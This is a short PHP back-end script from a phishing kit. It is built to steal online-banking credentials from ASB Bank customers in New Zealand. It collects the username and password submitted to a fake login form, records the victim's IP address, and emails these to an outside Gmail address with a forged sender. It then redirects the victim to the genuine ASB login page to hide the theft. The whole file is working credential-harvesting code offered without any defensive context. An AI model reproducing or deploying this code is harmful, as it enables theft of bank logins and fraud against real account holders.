<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n";
$msg .= "Username: ".$_POST['username']."\n";
$msg .= "Password: ".$_POST['password']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "------Created By TimSLake-----\n";
$post = "abs001000@gmail.com";
$subj = "asb.co.nz - ReZulTz\n";
$from = "From: $ip<logs@support.nz>";
mail("$post",$subj, $msg, $from); 
header("Location: https://online.asb.co.nz/auth/");  	  
?>


